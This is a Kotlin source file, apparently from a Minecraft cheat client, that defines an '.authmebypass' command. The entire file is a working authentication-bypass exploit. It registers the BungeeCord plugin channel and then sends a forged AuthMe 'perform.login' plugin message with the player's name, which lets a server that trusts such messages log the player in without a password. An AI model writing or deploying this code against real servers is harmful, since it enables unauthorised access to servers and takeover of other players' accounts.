package cc.zork.commands

import io.netty.buffer.Unpooled
import net.minecraft.client.Minecraft
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C17PacketCustomPayload
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream


class AuthMeBypassCommand : Command("AuthmeBypass", "Bypass authme.", ".authmebypass") {
    override fun execute(args: List<String>): Boolean {
        val buffer1 = PacketBuffer(Unpooled.buffer())
        buffer1.writeString("BungeeCord")
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(C17PacketCustomPayload("REGISTER", buffer1))

        val buffer2 = ByteArrayOutputStream()
        val out = DataOutputStream(buffer2)
        out.writeUTF("AuthMe.v2")
        out.writeUTF("perform.login")
        out.writeUTF(Minecraft.getMinecraft().thePlayer.name)

        val buffer3 = PacketBuffer(Unpooled.buffer())
        buffer3.writeBytes(buffer2.toByteArray())
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(C17PacketCustomPayload("BungeeCord", buffer3))

        return true
    }
}